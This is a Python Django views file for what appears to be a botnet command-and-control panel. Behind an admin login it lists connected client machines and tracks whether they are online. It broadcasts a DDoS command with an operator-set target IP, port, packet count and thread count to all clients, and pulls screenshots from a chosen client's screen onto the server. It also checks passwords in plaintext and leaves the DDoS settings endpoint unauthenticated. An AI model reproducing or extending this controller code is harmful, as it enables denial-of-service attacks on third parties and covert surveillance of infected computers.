import os
from threading import Thread

from django.shortcuts import render, redirect

# Create your views here.
from client import server
from client.models import user, client_setting, Client, picture


def login_index(request):
    return render(request, 'login.html')


def login(request):
    username = request.POST.get("username")
    password = request.POST.get("password")
    if user.objects.filter(username=username, password=password):
        request.session['username'] = username
        return redirect("/index")
    else:
        return render(request, 'login.html', {'errmsg': '用户名或密码错误'})


def update_version(request):
    username = request.session.get('username')
    if username == "admin":
        data = client_setting.objects.get(id=1)
        return render(request, 'update_version.html', {"data": data})
    else:
        return redirect("/")


def index(request):
    file_path = os.getcwd()
    print(file_path)
    username = request.session.get('username')
    if username == "admin":
        client_data = Client.objects.all()
        return render(request, 'index.html', {'client_data': client_data})
    else:
        return redirect("/")


def client_set(request):
    username = request.session.get('username')
    if username == "admin":
        set_data = client_setting.objects.get(id=1)
        return render(request, 'client_setting.html', {'set_data': set_data})
    else:
        return redirect("/")


def update_client_set(request):
    username = request.session.get('username')
    if username == "admin":
        ip = request.POST.get('ip')
        port = request.POST.get('port')
        version = request.POST.get('version')
        status = request.POST.get('status')
        set_data = client_setting.objects.get(id=1)
        set_data.ip = ip
        set_data.port = port
        set_data.version = version
        set_data.status = status
        set_data.save()
        return redirect('/client_setting')
    else:
        return redirect("/")


# 用户命令
def cmd_pool(cmd):
    client_list, client_addr_list, client_username_list = server.data_list()
    if cmd == "start":
        t = Thread(target=server.connect)
        t.start()
    elif cmd == "sessions":
        b = 0
        for real_client in client_list:
            try:
                real_client.send('sessions'.encode('utf-8'))
                real_client.recv(10000).decode('utf-8', "ignore")
                server.update_status_online_mysql(client_addr_list[b][0])
            except:
                server.update_status_mysql(client_addr_list[b][0])
                del client_list[b]
                del client_addr_list[b]
    elif cmd == "exit":
        server.update_status_offline_mysql()
        exit()
    elif cmd == "ddos":
        cmd = "ddos" + " " + ip + " " + port + " " + pack + " " + thread
        for i in client_list:
            i.send(cmd.encode('utf-8'))
            data = i.recv(2048).decode('utf-8')
            print(data)
    elif cmd.split(' ')[0] == "screen":
        file_path = os.getcwd()
        addr = client_addr_list[int(cmd.split(" ")[1])]
        client = client_list[int(cmd.split(" ")[1])]
        client.send('screen shoot'.encode('utf-8'))
        file = open(f"{file_path}\\static\\screen\\{addr}.jpg", 'wb')
        print("[*]正在接受图片,请等待！")
        while True:
            # 指定最大接收量
            data = client.recv(4024)
            file.write(data)
            if not data:
                break
        print("[*]接受图片完成!")
        Picture = picture(path=addr)
        Picture.save()
        file.close()
        client.close()


def start(request):
    username = request.session.get('username')
    if username == "admin":
        cmd_pool("start")
        return redirect('/index')
    else:
        return redirect("/")


def sessions(request):
    username = request.session.get('username')
    if username == "admin":
        cmd_pool("sessions")
        return redirect('/index')
    else:
        return redirect("/")


def exit_t(request):
    username = request.session.get('username')
    if username == "admin":
        try:
            cmd_pool("exit")
            return redirect('/index')
        except:
            return redirect('/index')
    else:
        return redirect("/")


def ddos_setting_index(request):
    return render(request, 'ddos_setting.html')


def ddos_setting(request):
    global ip
    global port
    global pack
    global thread
    ip = request.POST.get("ip")
    port = request.POST.get("port")
    pack = request.POST.get("pack")
    thread = request.POST.get("thread")
    return redirect("/index")


def ddos(request):
    username = request.session.get('username')
    if username == "admin":
        cmd_pool("ddos")
        return redirect('/index')
    else:
        return redirect("/")


def screen(request, screen_ip):
    username = request.session.get('username')
    if username == "admin":
        client_list, client_addr_list, client_username_list = server.data_list()
        print("client_list:", client_list)
        client_ip_list = []
        for i in client_addr_list:
            client_ip_list.append(i[0])
        print("clien_ip:", client_ip_list)
        Index = client_ip_list.index(screen_ip)
        print("接受截图(index)：", Index)
        cmd_pool(f"screen {Index}")
        return redirect('/index')
    else:
        return redirect("/")


def picture_index(request):
    picture_path = picture.objects.all()
    return render(request, 'picture.html', {"picture_data": picture_path})
